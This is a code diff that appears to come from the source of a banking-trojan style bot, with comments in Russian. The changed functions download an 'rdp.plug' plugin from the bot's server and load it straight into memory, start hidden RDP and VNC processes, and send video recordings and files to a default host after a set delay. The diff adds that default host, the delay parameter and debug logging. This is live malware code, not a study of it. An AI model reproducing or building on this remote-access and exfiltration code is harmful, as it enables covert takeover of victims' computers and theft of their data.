@@ -241,7 +241,7 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 //инициализация (запуск) нового менеджера 
 struct MsgInit
 {
-	char ip[16];
+	char ip[24];
 	int port;
 	int flags;
 	int downtime; //время бездействия после которого менеджер уходит в режим спячки
@@ -270,7 +270,7 @@ static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel 
 					num = i;
 					break;
 				}
-			if( i >= MaxServers ) //такой сервер уже подключен
+			if( i >= MaxServers ) //такой сервер не подключен
 			{
 				servers[num] = id;
 				if( mi->flags & TVideoRecDLL::RunCallback )
@@ -287,6 +287,8 @@ int Init( int flags, const char* ip, int port, int downtime )
 {
 	MsgInit msg;
 	SafeCopyStr( msg.ip, sizeof(msg.ip), ip );
+	if( msg.ip[0] == 0 ) //сервер не указан берем по умолчанию
+		m_lstrcpy( msg.ip, VIDEO_REC_HOST1 );
 	msg.port = port == 0 ? VIDEORECORD_DEFAULT_PORT : port;
 	msg.flags = flags;
 	msg.downtime = downtime;
@@ -371,6 +373,7 @@ struct MsgSendFiles
 	char name[128]; //имя записи
 	char path[MAX_PATH]; //имя файла или папка которые нужно передать
 	int numServer;
+	int after; //через сколько секунд начать отправку
 	DWORD id; //идентификатор отправки (для проверки в асинхронной отправки)
 };
 
@@ -381,15 +384,16 @@ static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Ca
 	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
 	VDRDBG( "Video", "Start send files %s", msg->path );
 	if( dll )
-		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->path );
+		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->name, msg->path, msg->after );
 }
 
-DWORD SendFiles( int server, const char* name, const char* path, bool async )
+DWORD SendFiles( int server, const char* name, const char* path, int after, bool async )
 {
 	MsgSendFiles msg;
 	SafeCopyStr( msg.name, sizeof(msg.name), name );
 	SafeCopyStr( msg.path, sizeof(msg.name), path );
 	msg.numServer = server;
+	msg.after = after;
 	char buf[64];
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendFilesAsync).t_str(), (char*)&msg, sizeof(msg), &msg );
 	if( async )
@@ -451,6 +455,7 @@ static DWORD WINAPI SendLogThread( void* msg )
 {
 	char buf[64];
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendLog).t_str(), (char*)msg, sizeof(MsgSendLog), 0 );
+	MemFree(msg);
 	return 0;
 }
 
@@ -466,7 +471,7 @@ bool SendLog( int server, const char* name, int code, const char* text )
 	return true;
 }
 
-static DWORD WINAPI ProcessRDP(void*)
+DWORD WINAPI ProcessRDP(void*)
 {
 	typedef int (WINAPIV* PINIT) (char* config);
 	typedef int (WINAPIV* PSTART)();
@@ -474,11 +479,13 @@ static DWORD WINAPI ProcessRDP(void*)
 	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);
 
 	BOT::Initialize(ProcessUnknown);
+	VDRDBG( "Video", "Запущен процесс RDP" );
 	DWORD c_data;
 	BYTE* data = Plugin::Download( "rdp.plug", 0, &c_data, false );
 	//BYTE* data = File::ReadToBufferA( "c:\\rdp.dll", c_data );
 	if( data )
 	{
+		VDRDBG( "Video", "RDP плагин загружен" );
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
 		if( module )
 		{
@@ -491,7 +498,9 @@ static DWORD WINAPI ProcessRDP(void*)
 				VDRDBG( "Video", "Init RDP" );
 				Init(GetStr(RDPRunParam).t_str());
 				HANDLE mutex = CaptureMutex( "RDP", 10000 ); //сообщаем что RDP запустился
+				VDRDBG( "Video", "RDP before start" );
 				Start();
+				VDRDBG( "Video", "RDP after start" );
 				if( mutex )
 				{
 					for(;;) // ждем команды на выключение
@@ -515,7 +524,7 @@ static DWORD WINAPI ProcessRDP(void*)
 	return 0;
 }
 
-static DWORD WINAPI ProcessVNC(void*)
+DWORD WINAPI ProcessVNC(void*)
 {
 	BOT::Initialize(ProcessUnknown);
 
